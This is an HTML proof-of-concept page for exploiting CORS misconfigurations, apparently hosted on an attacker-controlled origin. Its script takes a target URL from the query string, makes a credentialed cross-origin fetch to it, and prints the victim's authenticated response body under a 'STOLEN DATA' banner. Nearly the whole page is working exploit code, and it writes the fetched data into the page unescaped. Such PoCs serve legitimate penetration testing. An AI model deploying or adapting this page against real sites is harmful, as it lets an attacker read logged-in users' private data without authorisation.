<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dynamic CORS PoC - Attacker Origin (pipelock.dev)</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #1a1a1a; color: #eaeaea; }
        .container { background-color: #2b2b2b; padding: 25px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.4); }
        h1 { color: #00AEEF; border-bottom: 2px solid #00AEEF; padding-bottom: 5px; }
        h2 { color: #00CC66; }
        pre { 
            background-color: #3e3e3e; 
            padding: 15px; 
            border: 1px solid #444; 
            white-space: pre-wrap; 
            word-wrap: break-word; 
            color: #eaeaea;
        }
        code { background-color: #3e3e3e; color: #00CC66; padding: 2px 4px; border-radius: 3px; }
        .note { margin-top: 20px; padding: 10px; background-color: #442222; border-left: 5px solid #f44336; color: #f44336; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Cross-Origin Resource Sharing (CORS) PoC</h1>
        
        <div class="note">
            <strong>CRITICAL USAGE:</strong> The Origin attempting the fetch is <code id="attacker-origin">https://pipelock.dev</code>.
            <br>
            <strong>PoC URL Example:</strong> <code>https://pipelock.dev/cors_test.html?target=https://vulnerable-target.com/api/user-data</code>
        </div>

        <h2>Request Summary</h2>
        <p><strong>Target Endpoint:</strong> <code id="target-url-display">N/A</code></p>

        <h2>Result & Response</h2>
        <pre id="result">Waiting for target URL to be defined in URL parameters...</pre>

        <script>
            const urlParams = new URLSearchParams(window.location.search);
            const TARGET_URL = urlParams.get('target');
            const resultElement = document.getElementById('result');

            document.getElementById('attacker-origin').textContent = window.location.origin;

            if (!TARGET_URL) {
                resultElement.innerHTML = "<strong>ERROR:</strong> No target URL specified. Add a <code>?target=...</code> parameter.";
            } else {
                document.getElementById('target-url-display').textContent = TARGET_URL;
                resultElement.textContent = `Attempting authenticated cross-origin fetch from ${TARGET_URL}...`;

                fetch(TARGET_URL, {
                    credentials: 'include' 
                })
                .then(response => {
                    // Record key response headers for triaging
                    const headers = `Access-Control-Allow-Origin: ${response.headers.get('Access-Control-Allow-Origin')}\nStatus: ${response.status} ${response.statusText}`;
                    
                    if (response.ok) {
                        return response.text().then(data => {
                            resultElement.innerHTML = 
                                "<h2>[SUCCESS] VULNERABILITY CONFIRMED</h2>" +
                                "Data successfully read by attacker's origin! This confirms a read-access CORS misconfiguration.<br>" +
                                "The server likely returned <code>Access-Control-Allow-Credentials: true</code> and a dynamic/wildcard <code>A-C-A-Origin</code> header.<br><br>" +
                                "<strong>--- STOLEN DATA (Response Body) ---</strong><br>" + data;
                        });
                    } else {
                        throw new Error(`HTTP Status ${response.status}: ${response.statusText || 'Request Blocked'}`);
                    }
                })
                .catch(error => {
                    resultElement.innerHTML = `
                        <h2>[FAILURE/BLOCKED] CORS Defense Active</h2>
                        <strong>Details:</strong> ${error.message}<br><br>
                        Note: The browser likely blocked reading the response because the server did not return the required CORS headers.
                    `;
                });
            }
        </script>
    </div>
</body>
</html>
